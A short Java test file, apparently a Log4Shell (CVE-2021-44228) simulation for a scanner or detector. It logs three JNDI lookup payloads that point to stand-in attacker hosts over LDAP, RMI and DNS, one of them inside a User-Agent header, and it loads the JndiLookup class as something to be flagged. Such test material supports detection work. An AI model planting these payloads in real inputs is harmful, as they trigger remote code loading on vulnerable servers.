import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class Log4jExploitTest {
    private static final Logger logger = LogManager.getLogger(Log4jExploitTest.class);

    public static void main(String[] args) {
        // Log4Shell Attack Simulation
        String userInput = "${jndi:ldap://malicious-server.com/exploit}"; // CVE-2021-44228
        logger.error("User input: " + userInput);

        // Another exploit using HTTP Headers
        String headerAttack = "User-Agent: ${jndi:rmi://evil.com/exploit}";
        logger.warn(headerAttack);

        // Log4j Debug Log
        logger.debug("Debugging with ${jndi:dns://hacker.com/exploit}");

        // Using JndiLookup Class (Should be flagged)
        try {
            Class<?> lookup = Class.forName("org.apache.logging.log4j.core.lookup.JndiLookup");
            logger.info("JndiLookup class detected: " + lookup.getName());
        } catch (Exception e) {
            logger.error("Failed to load JndiLookup class", e);
        }
    }
}
